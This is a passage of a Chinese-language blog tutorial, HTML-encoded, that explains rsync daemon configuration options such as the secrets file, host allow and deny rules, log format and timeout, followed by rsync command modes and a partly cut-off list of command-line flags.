file</code>&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x5305;&#x542B;&#x5B9A;&#x4E49;&#x7528;&#x6237;&#x540D;: &#x5BC6;&#x7801;&#x5BF9;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x53EA;&#x6709;&#x5728;<code>&#x201D;auth users&#x201D;</code> &#x88AB;&#x5B9A;&#x4E49;&#x65F6;&#xFF0C;&#x8BE5;&#x6587;&#x4EF6;&#x624D;&#x6709;&#x4F5C;&#x7528;&#x3002;&#x6587;&#x4EF6;&#x6BCF;&#x884C;&#x5305;&#x542B;&#x4E00;&#x4E2A; <code>username:passwd</code> &#x5BF9;&#x3002;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#x5BC6;&#x7801;&#x6700;&#x597D;&#x4E0D;&#x8981;&#x8D85;&#x8FC7; <code>8</code> &#x4E2A;&#x5B57;&#x7B26;&#x3002;&#x6CA1;&#x6709;&#x9ED8;&#x8BA4;&#x7684; <code>secures file</code>&#xFF0C;&#x9700;&#x8981;&#x9650;&#x5F0F;&#x6307;&#x5B9A;&#x4E00;&#x4E2A; (&#x4F8B;&#x5982;&#xFF1A;<code>/etc/rsyncd.passwd</code>)&#x3002;&#x6CE8;&#x610F;&#xFF1A;&#x8BE5;&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#x4E00;&#x5B9A;&#x8981;&#x662F; <code>600</code>&#xFF0C;&#x5426;&#x5219;&#x5BA2;&#x6237;&#x7AEF;&#x5C06;&#x4E0D;&#x80FD;&#x8FDE;&#x63A5;&#x670D;&#x52A1;&#x5668;&#x3002;</p><p><code>strict modes</code>&#x6307;&#x5B9A;&#x662F;&#x5426;&#x76D1;&#x6D4B;&#x5BC6;&#x7801;&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#xFF0C;&#x5982;&#x679C;&#x8BE5;&#x9009;&#x9879;&#x503C;&#x4E3A; <code>true</code> &#x90A3;&#x4E48;&#x5BC6;&#x7801;&#x6587;&#x4EF6;&#x53EA;&#x80FD;&#x88AB; <code>rsync</code> &#x670D;&#x52A1;&#x5668;&#x8FD0;&#x884C;&#x8EAB;&#x4EFD;&#x7684;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#xFF0C;&#x5176;&#x4ED6;&#x4EFB;&#x4F55;&#x7528;&#x6237;&#x4E0D;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x8BE5;&#x6587;&#x4EF6;&#x3002;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A; <code>true</code>&#x3002;</p><p><code>hosts allow</code>&#x6307;&#x5B9A;&#x54EA;&#x4E9B; <code>IP</code> &#x7684;&#x5BA2;&#x6237;&#x5141;&#x8BB8;&#x8FDE;&#x63A5;&#x8BE5;&#x6A21;&#x5757;&#x3002;&#x5BA2;&#x6237;&#x6A21;&#x5F0F;&#x5B9A;&#x4E49;&#x53EF;&#x4EE5;&#x662F;&#x4EE5;&#x4E0B;&#x5F62;&#x5F0F;&#xFF1A;</p><ul><li>&#x5355;&#x4E2A; IP &#x5730;&#x5740;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;192.167.0.1</li><li>&#x6574;&#x4E2A;&#x7F51;&#x6BB5;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;192.168.0.0/24&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F; 192.168.0.0/255.255.255.0</li><li>&#x591A;&#x4E2A; IP &#x6216;&#x7F51;&#x6BB5;&#x9700;&#x8981;&#x7528;&#x7A7A;&#x683C;&#x9694;&#x5F00;&#xFF0C;<code>&#x201C;*&#x201D;</code> &#x5219;&#x8868;&#x793A;&#x6240;&#x6709;&#xFF0C;&#x9ED8;&#x8BA4;&#x662F;&#x5141;&#x8BB8;&#x6240;&#x6709;&#x4E3B;&#x673A;&#x8FDE;&#x63A5;&#x3002;</li></ul><p><code>hosts deny</code>&#x6307;&#x5B9A;&#x4E0D;&#x5141;&#x8BB8;&#x8FDE;&#x63A5; <code>rsync</code> &#x670D;&#x52A1;&#x5668;&#x7684;&#x673A;&#x5668;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; <code>hosts allow</code> &#x7684;&#x5B9A;&#x4E49;&#x65B9;&#x5F0F;&#x6765;&#x8FDB;&#x884C;&#x5B9A;&#x4E49;&#x3002;&#x9ED8;&#x8BA4;&#x662F;&#x6CA1;&#x6709; <code>hosts deny</code> &#x5B9A;&#x4E49;&#x3002;</p><p><code>ignore errors</code>&#x6307;&#x5B9A; <code>rsyncd</code> &#x5728;&#x5224;&#x65AD;&#x662F;&#x5426;&#x8FD0;&#x884C;&#x4F20;&#x8F93;&#x65F6;&#x7684;&#x5220;&#x9664;&#x64CD;&#x4F5C;&#x65F6;&#x5FFD;&#x7565; <code>server</code> &#x4E0A;&#x7684; <code>IO</code> &#x9519;&#x8BEF;&#xFF0C;&#x4E00;&#x822C;&#x6765;&#x8BF4; <code>rsync</code> &#x5728;&#x51FA;&#x73B0; <code>IO</code> &#x9519;&#x8BEF;&#x65F6;&#x5C06;&#x5C06;&#x8DF3;&#x8FC7;<code>--delete</code>&#x64CD;&#x4F5C;&#xFF0C;&#x4EE5;&#x9632;&#x6B62;&#x56E0;&#x4E3A;&#x6682;&#x65F6;&#x7684;&#x8D44;&#x6E90;&#x4E0D;&#x8DB3;&#x6216;&#x5176;&#x5B83; <code>IO</code> &#x9519;&#x8BEF;&#x5BFC;&#x81F4;&#x7684;&#x4E25;&#x91CD;&#x95EE;&#x9898;&#x3002;</p><p><code>ignore nonreadable</code>&#x6307;&#x5B9A; <code>rysnc</code> &#x670D;&#x52A1;&#x5668;&#x5B8C;&#x5168;&#x5FFD;&#x7565;&#x90A3;&#x4E9B;&#x7528;&#x6237;&#x6CA1;&#x6709;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x8FD9;&#x5BF9;&#x4E8E;&#x5728;&#x9700;&#x8981;&#x5907;&#x4EFD;&#x7684;&#x76EE;&#x5F55;&#x4E2D;&#x6709;&#x4E9B;&#x6587;&#x4EF6;&#x662F;&#x4E0D;&#x5E94;&#x8BE5;&#x88AB;&#x5907;&#x4EFD;&#x8005;&#x5F97;&#x5230;&#x7684;&#x60C5;&#x51B5;&#x662F;&#x6709;&#x610F;&#x4E49;&#x7684;&#x3002;</p><p><code>lock file</code>&#x6307;&#x5B9A;&#x652F;&#x6301; <code>max connections</code> &#x53C2;&#x6570;&#x7684;&#x9501;&#x6587;&#x4EF6;&#xFF0C;&#x9ED8;&#x8BA4;&#x503C;&#x662F; <code>/var/run/rsyncd.lock</code>&#x3002;</p><p><code>transfer logging</code>&#x4F7F; <code>rsync</code> &#x670D;&#x52A1;&#x5668;&#x4F7F;&#x7528; <code>ftp</code> &#x683C;&#x5F0F;&#x7684;&#x6587;&#x4EF6;&#x6765;&#x8BB0;&#x5F55;&#x4E0B;&#x8F7D;&#x548C;&#x4E0A;&#x8F7D;&#x64CD;&#x4F5C;&#x5728;&#x81EA;&#x5DF1;&#x5355;&#x72EC;&#x7684;&#x65E5;&#x5FD7;&#x4E2D;&#x3002;</p><p><code>log format</code>&#x901A;&#x8FC7;&#x8BE5;&#x9009;&#x9879;&#x7528;&#x6237;&#x5728;&#x4F7F;&#x7528; <code>transfer logging</code> &#x53EF;&#x4EE5;&#x81EA;&#x5DF1;&#x5B9A;&#x5236;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x7684;&#x5B57;&#x6BB5;&#x3002;&#x5176;&#x683C;&#x5F0F;&#x662F;&#x4E00;&#x4E2A;&#x5305;&#x542B;&#x683C;&#x5F0F;&#x5B9A;&#x4E49;&#x7B26;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x7684;&#x683C;&#x5F0F;&#x5B9A;&#x4E49;&#x7B26;&#x5982;&#x4E0B;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">%h &#x8FDC;&#x7A0B;&#x4E3B;&#x673A;&#x540D;</span><br><span class="line">%a &#x8FDC;&#x7A0B;IP&#x5730;&#x5740;</span><br><span class="line">%l &#x6587;&#x4EF6;&#x957F;&#x5EA6;&#x5B57;&#x7B26;&#x6570;</span><br><span class="line">%p &#x8BE5;&#x6B21;rsync&#x4F1A;&#x8BDD;&#x7684;&#x8FDB;&#x7A0B;id</span><br><span class="line">%o &#x64CD;&#x4F5C;&#x7C7B;&#x578B;&#xFF1A;<span class="string">&quot;send&quot;</span>&#x6216;<span class="string">&quot;recv&quot;</span></span><br><span class="line">%f &#x6587;&#x4EF6;&#x540D;</span><br><span class="line">%P &#x6A21;&#x5757;&#x8DEF;&#x5F84;</span><br><span class="line">%m &#x6A21;&#x5757;&#x540D;</span><br><span class="line">%t &#x5F53;&#x524D;&#x65F6;&#x95F4;</span><br><span class="line">%u &#x8BA4;&#x8BC1;&#x7684;&#x7528;&#x6237;&#x540D;(&#x533F;&#x540D;&#x65F6;&#x662F;null)</span><br><span class="line">%b &#x5B9E;&#x9645;&#x4F20;&#x8F93;&#x7684;&#x5B57;&#x8282;&#x6570;</span><br><span class="line">%c &#x5F53;&#x53D1;&#x9001;&#x6587;&#x4EF6;&#x65F6;&#xFF0C;&#x8BE5;&#x5B57;&#x6BB5;&#x8BB0;&#x5F55;&#x8BE5;&#x6587;&#x4EF6;&#x7684;&#x6821;&#x9A8C;&#x7801;</span><br><span class="line">&#x9ED8;&#x8BA4;<span class="built_in">log</span>&#x683C;&#x5F0F;&#x4E3A;&#xFF1A;`%o %h [%a] %m (%u) %f %l`&#xFF0C;&#x4E00;&#x822C;&#x6765;&#x8BF4;,&#x5728;&#x6BCF;&#x884C;&#x7684;&#x5934;&#x4E0A;&#x4F1A;&#x6DFB;&#x52A0;`%t [%p]`&#x3002;&#x5728;&#x6E90;&#x4EE3;&#x7801;&#x4E2D;&#x540C;&#x65F6;&#x53D1;&#x5E03;&#x6709;&#x4E00;&#x4E2A;&#x53EB;rsyncstats&#x7684;perl&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x6765;&#x7EDF;&#x8BA1;&#x8FD9;&#x79CD;&#x683C;&#x5F0F;&#x7684;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x3002;</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>timeout</code>&#x901A;&#x8FC7;&#x8BE5;&#x9009;&#x9879;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x5BA2;&#x6237;&#x6307;&#x5B9A;&#x7684; <code>IP</code> &#x8D85;&#x65F6;&#x65F6;&#x95F4;&#x3002;&#x901A;&#x8FC7;&#x8BE5;&#x9009;&#x9879;&#x53EF;&#x4EE5;&#x786E;&#x4FDD; <code>rsync</code> &#x670D;&#x52A1;&#x5668;&#x4E0D;&#x4F1A;&#x6C38;&#x8FDC;&#x7B49;&#x5F85;&#x4E00;&#x4E2A;&#x5D29;&#x6E83;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x3002;&#x8D85;&#x65F6;&#x5355;&#x4F4D;&#x4E3A;&#x79D2;&#x949F;&#xFF0C;<code>0</code> &#x8868;&#x793A;&#x6CA1;&#x6709;&#x8D85;&#x65F6;&#x5B9A;&#x4E49;&#xFF0C;&#x8FD9;&#x4E5F;&#x662F;&#x9ED8;&#x8BA4;&#x503C;&#x3002;&#x5BF9;&#x4E8E;&#x533F;&#x540D; <code>rsync</code> &#x670D;&#x52A1;&#x5668;&#x6765;&#x8BF4;&#xFF0C;&#x4E00;&#x4E2A;&#x7406;&#x60F3;&#x7684;&#x6570;&#x5B57;&#x662F; <code>600</code>&#x3002;</p><p><code>refuse options</code>&#x901A;&#x8FC7;&#x8BE5;&#x9009;&#x9879;&#x53EF;&#x4EE5;&#x5B9A;&#x4E49;&#x4E00;&#x4E9B;&#x4E0D;&#x5141;&#x8BB8;&#x5BA2;&#x6237;&#x5BF9;&#x8BE5;&#x6A21;&#x5757;&#x4F7F;&#x7528;&#x7684;&#x547D;&#x4EE4;&#x53C2;&#x6570;&#x5217;&#x8868;&#x3002;&#x8FD9;&#x91CC;&#x5FC5;&#x987B;&#x4F7F;&#x7528;&#x547D;&#x4EE4;&#x5168;&#x540D;&#xFF0C;&#x800C;&#x4E0D;&#x80FD;&#x662F;&#x7B80;&#x79F0;&#x3002;&#x4F46;&#x53D1;&#x751F;&#x62D2;&#x7EDD;&#x67D0;&#x4E2A;&#x547D;&#x4EE4;&#x7684;&#x60C5;&#x51B5;&#x65F6;&#x670D;&#x52A1;&#x5668;&#x5C06;&#x62A5;&#x544A;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x7136;&#x540E;&#x9000;&#x51FA;&#x3002;&#x5982;&#x679C;&#x8981;&#x9632;&#x6B62;&#x4F7F;&#x7528;&#x538B;&#x7F29;&#xFF0C;&#x5E94;&#x8BE5;&#x662F;&#xFF1A;<code>dont compress = *</code>&#x3002;</p><p><code>dont compress</code>&#x7528;&#x6765;&#x6307;&#x5B9A;&#x90A3;&#x4E9B;&#x4E0D;&#x8FDB;&#x884C;&#x538B;&#x7F29;&#x5904;&#x7406;&#x518D;&#x4F20;&#x8F93;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x9ED8;&#x8BA4;&#x503C;&#x662F; <code>*.gz</code> <code>*.tgz</code> <code>*.zip</code> <code>*.z</code> <code>*.rpm</code> <code>*.deb</code> <code>*.iso</code> <code>*.bz2</code> <code>*.tbz</code></p><h2 id="Rsync-&#x547D;&#x4EE4;"><a href="#Rsync-&#x547D;&#x4EE4;" class="headerlink" title="Rsync &#x547D;&#x4EE4;"></a>Rsync &#x547D;&#x4EE4;</h2><p>&#x5728;&#x5BF9; rsync &#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x7ED3;&#x675F;&#x4EE5;&#x540E;&#xFF0C;&#x4E0B;&#x4E00;&#x6B65;&#x5C31;&#x9700;&#x8981;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x51FA; rsync &#x547D;&#x4EE4;&#x6765;&#x5B9E;&#x73B0;&#x5C06;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x7684;&#x6587;&#x4EF6;&#x5907;&#x4EFD;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#x6765;&#x3002;rsync &#x662F;&#x4E00;&#x4E2A;&#x529F;&#x80FD;&#x975E;&#x5E38;&#x5F3A;&#x5927;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x5176;&#x547D;&#x4EE4;&#x4E5F;&#x6709;&#x5F88;&#x591A;&#x529F;&#x80FD;&#x7279;&#x8272;&#x9009;&#x9879;&#xFF0C;&#x4E0B;&#x9762;&#x5C31;&#x5BF9;&#x5B83;&#x7684;&#x9009;&#x9879;&#x4E00;&#x4E00;&#x8FDB;&#x884C;&#x5206;&#x6790;&#x8BF4;&#x660E;&#x3002;<br>Rsync &#x7684;&#x547D;&#x4EE4;&#x683C;&#x5F0F;&#x53EF;&#x4EE5;&#x4E3A;&#x4EE5;&#x4E0B;&#x516D;&#x79CD;&#xFF1A;</p><ol><li><code>rsync [OPTION]... SRC DEST</code></li><li><code>rsync [OPTION]... SRC [USER@]HOST:DEST</code></li><li><code>rsync [OPTION]... [USER@]HOST:SRC DEST</code></li><li><code>rsync [OPTION]... [USER@]HOST::SRC DEST</code></li><li><code>rsync [OPTION]... SRC [USER@]HOST::DEST</code></li><li><code>rsync [OPTION]... rsync://[USER@]HOST[:PORT]/SRC [DEST]</code></li></ol><p>&#x5BF9;&#x5E94;&#x4E8E;&#x4EE5;&#x4E0A;&#x516D;&#x79CD;&#x547D;&#x4EE4;&#x683C;&#x5F0F;&#xFF0C;rsync &#x6709;&#x516D;&#x79CD;&#x4E0D;&#x540C;&#x7684;&#x5DE5;&#x4F5C;&#x6A21;&#x5F0F;&#xFF1A;</p><ol><li>&#x62F7;&#x8D1D;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x3002;&#x5F53; SRC &#x548C; DES &#x8DEF;&#x5F84;&#x4FE1;&#x606F;&#x90FD;&#x4E0D;&#x5305;&#x542B;&#x6709;&#x5355;&#x4E2A;&#x5192;&#x53F7;&#x201D;:&#x201D; &#x5206;&#x9694;&#x7B26;&#x65F6;&#x5C31;&#x542F;&#x52A8;&#x8FD9;&#x79CD;&#x5DE5;&#x4F5C;&#x6A21;&#x5F0F;&#x3002;&#x5982;&#xFF1A;rsync -a /data /backup</li><li>&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x8FDC;&#x7A0B; shell &#x7A0B;&#x5E8F; (&#x5982; rsh&#x3001;ssh) &#x6765;&#x5B9E;&#x73B0;&#x5C06;&#x672C;&#x5730;&#x673A;&#x5668;&#x7684;&#x5185;&#x5BB9;&#x62F7;&#x8D1D;&#x5230;&#x8FDC;&#x7A0B;&#x673A;&#x5668;&#x3002;&#x5F53; DST &#x8DEF;&#x5F84;&#x5730;&#x5740;&#x5305;&#x542B;&#x5355;&#x4E2A;&#x5192;&#x53F7;&#x201D;:&#x201D;&#x5206;&#x9694;&#x7B26;&#x65F6;&#x542F;&#x52A8;&#x8BE5;&#x6A21;&#x5F0F;&#x3002;&#x5982;&#xFF1A;rsync -avz *.c foo:src</li><li>&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x8FDC;&#x7A0B; shell &#x7A0B;&#x5E8F; (&#x5982; rsh&#x3001;ssh) &#x6765;&#x5B9E;&#x73B0;&#x5C06;&#x8FDC;&#x7A0B;&#x673A;&#x5668;&#x7684;&#x5185;&#x5BB9;&#x62F7;&#x8D1D;&#x5230;&#x672C;&#x5730;&#x673A;&#x5668;&#x3002;&#x5F53; SRC &#x5730;&#x5740;&#x8DEF;&#x5F84;&#x5305;&#x542B;&#x5355;&#x4E2A;&#x5192;&#x53F7;&#x201D;:&#x201D;&#x5206;&#x9694;&#x7B26;&#x65F6;&#x542F;&#x52A8;&#x8BE5;&#x6A21;&#x5F0F;&#x3002;&#x5982;&#xFF1A;rsync -avz foo:src/bar /data</li><li>&#x4ECE;&#x8FDC;&#x7A0B; rsync &#x670D;&#x52A1;&#x5668;&#x4E2D;&#x62F7;&#x8D1D;&#x6587;&#x4EF6;&#x5230;&#x672C;&#x5730;&#x673A;&#x3002;&#x5F53; SRC &#x8DEF;&#x5F84;&#x4FE1;&#x606F;&#x5305;&#x542B;&#x201D;::&#x201D; &#x5206;&#x9694;&#x7B26;&#x65F6;&#x542F;&#x52A8;&#x8BE5;&#x6A21;&#x5F0F;&#x3002;&#x5982;&#xFF1A;rsync -av <a href="mailto:root@172.16.78.192" target="_blank" rel="noopener">root@172.16.78.192</a>::www /databack</li><li>&#x4ECE;&#x672C;&#x5730;&#x673A;&#x5668;&#x62F7;&#x8D1D;&#x6587;&#x4EF6;&#x5230;&#x8FDC;&#x7A0B; rsync &#x670D;&#x52A1;&#x5668;&#x4E2D;&#x3002;&#x5F53; DST &#x8DEF;&#x5F84;&#x4FE1;&#x606F;&#x5305;&#x542B;&#x201D;::&#x201D; &#x5206;&#x9694;&#x7B26;&#x65F6;&#x542F;&#x52A8;&#x8BE5;&#x6A21;&#x5F0F;&#x3002;&#x5982;&#xFF1A;rsync -av /databack <a href="mailto:root@172.16.78.192" target="_blank" rel="noopener">root@172.16.78.192</a>::www</li><li>&#x5217;&#x8FDC;&#x7A0B;&#x673A;&#x7684;&#x6587;&#x4EF6;&#x5217;&#x8868;&#x3002;&#x8FD9;&#x7C7B;&#x4F3C;&#x4E8E; rsync &#x4F20;&#x8F93;&#xFF0C;&#x4E0D;&#x8FC7;&#x53EA;&#x8981;&#x5728;&#x547D;&#x4EE4;&#x4E2D;&#x7701;&#x7565;&#x6389;&#x672C;&#x5730;&#x673A;&#x4FE1;&#x606F;&#x5373;&#x53EF;&#x3002;&#x5982;&#xFF1A;rsync -v rsync://172.16.78.192/www</li></ol><p>rsync &#x53C2;&#x6570;&#x7684;&#x5177;&#x4F53;&#x89E3;&#x91CA;&#x5982;&#x4E0B;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">-v, --verbose &#x8BE6;&#x7EC6;&#x6A21;&#x5F0F;&#x8F93;&#x51FA;</span><br><span class="line">-q, --quiet &#x7CBE;&#x7B80;&#x8F93;&#x51FA;&#x6A21;&#x5F0F;</span><br><span class="line">-c, --checksum &#x6253;&#x5F00;&#x6821;&#x9A8C;&#x5F00;&#x5173;&#xFF0C;&#x5F3A;&#x5236;&#x5BF9;&#x6587;&#x4EF6;&#x4F20;&#x8F93;&#x8FDB;&#x884C;&#x6821;&#x9A8C;</span><br><span class="line">-a, --archive &#x5F52;&#x6863;&#x6A21;&#x5F0F;&#xFF0C;&#x8868;&#x793A;&#x4EE5;&#x9012;&#x5F52;&#x65B9;&#x5F0F;&#x4F20;&#x8F93;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x4FDD;&#x6301;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x5C5E;&#x6027;&#xFF0C;&#x7B49;&#x4E8E;-rlptgoD</span><br><span class="line">-r, --recursive &#x5BF9;&#x5B50;&#x76EE;&#x5F55;&#x4EE5;&#x9012;&#x5F52;&#x6A21;&#x5F0F;&#x5904;&#x7406;</span><br><span class="line">-R, --relative &#x4F7F;&#x7528;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#x4FE1;&#x606F;</span><br><span class="line">-b, --backup &#x521B;&#x5EFA;&#x5907;&#x4EFD;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5BF9;&#x4E8E;&#x76EE;&#x7684;&#x5DF2;&#x7ECF;&#x5B58;&#x5728;&#x6709;&#x540C;&#x6837;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x65F6;&#xFF0C;&#x5C06;&#x8001;&#x7684;&#x6587;&#x4EF6;&#x91CD;&#x65B0;&#x547D;&#x540D;&#x4E3A;~filename&#x3002;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;--suffix&#x9009;&#x9879;&#x6765;&#x6307;&#x5B9A;&#x4E0D;&#x540C;&#x7684;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x524D;&#x7F00;&#x3002;</span><br><span class="line">--backup-dir &#x5C06;&#x5907;&#x4EFD;&#x6587;&#x4EF6;(&#x5982;~filename)&#x5B58;&#x653E;&#x5728;&#x5728;&#x76EE;&#x5F55;&#x4E0B;&#x3002;</span><br><span class="line">-suffix=SUFFIX &#x5B9A;&#x4E49;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x524D;&#x7F00;</span><br><span class="line">-u, --update &#x4EC5;&#x4EC5;&#x8FDB;&#x884C;&#x66F4;&#x65B0;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8DF3;&#x8FC7;&#x6240;&#x6709;&#x5DF2;&#x7ECF;&#x5B58;&#x5728;&#x4E8E;DST&#xFF0C;&#x5E76;&#x4E14;&#x6587;&#x4EF6;&#x65F6;&#x95F4;&#x665A;&#x4E8E;&#x8981;&#x5907;&#x4EFD;&#x7684;&#x6587;&#x4EF6;&#x3002;(&#x4E0D;&#x8986;&#x76D6;&#x66F4;&#x65B0;&#x7684;&#x6587;&#x4EF6;)</span><br><span class="line">-l, --links &#x4FDD;&#x7559;&#x8F6F;&#x94FE;&#x7ED3;</span><br><span class="line">-L, --copy-links &#x60F3;&#x5BF9;&#x5F85;&#x5E38;&#x89C4;&#x6587;&#x4EF6;&#x4E00;&#x6837;&#x5904;&#x7406;&#x8F6F;&#x94FE;&#x7ED3;</span><br><span class="line">--copy-unsafe-links &#x4EC5;&#x4EC5;&#x62F7;&#x8D1D;&#x6307;&#x5411;SRC&#x8DEF;&#x5F84;&#x76EE;&#x5F55;&#x6811;&#x4EE5;&#x5916;&#x7684;&#x94FE;&#x7ED3;</span><br><span class="line">--safe-links &#x5FFD;&#x7565;&#x6307;&#x5411;SRC&#x8DEF;&#x5F84;&#x76EE;&#x5F55;&#x6811;&#x4EE5;&#x5916;&#x7684;&#x94FE;&#x7ED3;</span><br><span class="line">-H, --hard-links &#x4FDD;&#x7559;&#x786C;&#x94FE;&#x7ED3;</span><br><span class="line">-p, --perms &#x4FDD;&#x6301;&#x6587;&#x4EF6;&#x6743;&#x9650;</span><br><span class="line">-o, --owner &#x4FDD;&#x6301;&#x6587;&#x4EF6;&#x5C5E;&#x4E3B;&#x4FE1;&#x606F;</span><br><span class="line">-g, --group &#x4FDD;&#x6301;&#x6587;&#x4EF6;&#x5C5E;&#x7EC4;&#x4FE1;&#x606F;</span><br><span class="line">-D, --devices &#x4FDD;&#x6301;&#x8BBE;&#x5907;&#x6587;&#x4EF6;&#x4FE1;&#x606F;</span><br><span class="line">-t, --<span class="built_in">times</span> &#x4FDD;&#x6301;&#x6587;&#x4EF6;&#x65F6;&#x95F4;&#x4FE1;&#x606F;</span><br><span class="line">-S, --sparse &#x5BF9;&#x7A00;&#x758F;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x7279;&#x6B8A;&#x5904;&#x7406;&#x4EE5;&#x8282;&#x7701;DST&#x7684;&#x7A7A;&#x95F4;</span><br><span class="line">-n, --dry-run&#x73B0;&#x5B9E;&#x54EA;&#x4E9B;&#x6587;&#x4EF6;&#x5C06;&#x88AB;&#x4F20;&#x8F93;</span><br><span class="line">-W, --whole-file &#x62F7;&#x8D1D;&#x6587;&#x4EF6;&#xFF0C;&#x4E0D;&#x8FDB;&#x884C;&#x589E;&#x91CF;&#x68C0;&#x6D4B;</span><br><span class="line">-x, --one-file-system &#x4E0D;&#x8981;&#x8DE8;&#x8D8A;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x8FB9;&#x754C;</span><br><span class="line">-B, --block-size=SIZE &#x68C0;&#x9A8C;&#x7B97;&#x6CD5;&#x4F7F;&#x7528;&#x7684;&#x5757;&#x5C3A;&#x5BF8;&#xFF0C;&#x9ED8;&#x8BA4;&#x662F;700&#x5B57;&#x8282;</span><br><span class="line">-e, --rsh=COMMAND &#x6307;&#x5B9A;&#x4F7F;&#x7528;rsh&#x3001;ssh&#x65B9;&#x5F0F;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x540C;&#x6B65;</span><br><span class="line">--rsync-path=PATH &#x6307;&#x5B9A;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;rsync&#x547D;&#x4EE4;&#x6240;&#x5728;&#x8DEF;&#x5F84;&#x4FE1;&#x606F;</span><br><span class="line">-C, --cvs-exclude &#x4F7F;&#x7528;&#x548C;CVS&#x4E00;&#x6837;&#x7684;&#x65B9;&#x6CD5;&#x81EA;&#x52A8;&#x5FFD;&#x7565;&#x6587;&#x4EF6;&#xFF0C;&#x7528;&#x6765;&#x6392;&#x9664;&#x90A3;&#x4E9B;&#x4E0D;&#x5E0C;&#x671B;&#x4F20;&#x8F93;&#x7684;&#x6587;&#x4EF6;</span><br><span class="line">--existing &#x4EC5;&#x4EC5;&#x66F4;&#x65B0;&#x90A3;&#x4E9B;&#x5DF2;&#x7ECF;&#x5B58;&#x5728;&#x4E8E;DST&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x800C;&#x4E0D;&#x5907;&#x4EFD;&#x90A3;&#x4E9B;&#x65B0;&#x521B;&#x5EFA;&#x7684;&#x6587;&#x4EF6;</span><br><span class="line">--delete &#x5220;&#x9664;&#x90A3;&#x4E9B;DST&#x4E2D;SRC&#x6CA1;&#x6709;&#x7684;&#x6587;&#x4EF6;</span><br><span class="line">--delete-excluded &#x540C;&#x6837;&#x5220;&#x9664;&#x63A5;&#x6536;&#x7AEF;&#x90A3;&#x4E9B;&#x88AB;&#x8BE5;&#x9009;&#x9879;&#x6307;&#x5B9A;&#x6392;&#x9664;&#x7684;&#x6587;&#x4EF6;</span><br><span class="line">--delete-after &#x4F20;&#x8F93;&#x7ED3;&#x675F;&#x4EE5;&#x540E;&#x518D;&#x5220;&#x9664;</span><br><span 